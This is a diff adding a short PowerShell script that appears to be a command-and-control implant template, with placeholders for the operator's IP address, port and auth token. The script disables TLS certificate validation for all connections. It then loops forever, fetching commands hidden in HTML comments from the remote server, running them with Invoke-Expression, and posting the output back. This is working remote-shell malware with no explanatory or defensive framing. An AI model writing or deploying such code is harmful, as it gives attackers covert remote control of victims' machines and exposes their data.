@@ -1,0 +1,8 @@
+$port="%port%";$ip="%ip%";$auth="%auth%";
+add-type @"
+using System.Net;using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$pool=(Invoke-RestMethod -Uri "https://${ip}:${port}/e030d4f6" -Headers @{"Authorization"=$auth}).ToString();while($true){Start-Sleep -Milliseconds 750;$c=(Invoke-RestMethod -Uri "https://${ip}:${port}/${pool}" -Headers @{"Authorization"=$auth}).ToString();$b=[regex]::Match($c, '<!--(.*?)-->').Groups[1].Value.TrimStart('!');if($b.StartsWith('*')){$pool=$b.TrimStart('*')}else{$asodifj=iex $b -ErrorAction Stop -ErrorVariable e;$asodifj=Out-String -InputObject $asodifj;Invoke-RestMethod -Uri "https://${ip}:${port}/${pool}" -Method Post -Headers @{"Authorization"=$auth} -Body ([System.Text.Encoding]::UTF8.GetBytes($asodifj) -join ' ')}}
